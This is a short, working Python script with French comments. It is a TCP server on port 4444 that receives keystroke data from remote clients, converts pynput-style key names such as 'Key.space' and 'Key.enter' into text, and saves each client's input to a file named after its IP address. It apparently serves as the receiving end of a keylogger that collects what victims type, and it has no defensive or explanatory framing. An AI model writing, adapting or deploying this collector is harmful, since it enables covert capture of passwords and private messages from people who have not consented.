import socket

def log_to_file(addr, data):
    """Enregistre les données reçues dans un fichier nommé d'après l'adresse IP du client."""
    filename = f"{addr[0]}.txt"
    with open(filename, "a") as file:  # 'a' pour append ajoute à la fin du fichier
        file.write(data + " ")  # Ajoute un espace après chaque donnée pour la lisibilité

def start_server(host='0.0.0.0', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Serveur en écoute sur {host}:{port}")
        while True:
            conn, addr = s.accept()
            with conn:
                print('Connecté par', addr)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    # Convertit les données reçues (assumées en bytes) en str et retire les guillemets et autres caractères non désirés
                    data_str = data.decode().strip("'").strip()
                    # Remplace les représentations de touches spéciales par des espaces ou des sauts de ligne si nécessaire
                    if data_str.startswith("Key"):
                        if "space" in data_str:
                            data_str = " "  # Espace pour Key.space
                        elif "enter" in data_str:
                            data_str = "\n"  # Nouvelle ligne pour Key.enter
                        else:
                            data_str = ""  # Ignore les autres touches spéciales
                    log_to_file(addr, data_str)
            print(f"Connexion avec {addr} fermée, en attente d'une nouvelle connexion...")

if __name__ == "__main__":
    start_server()
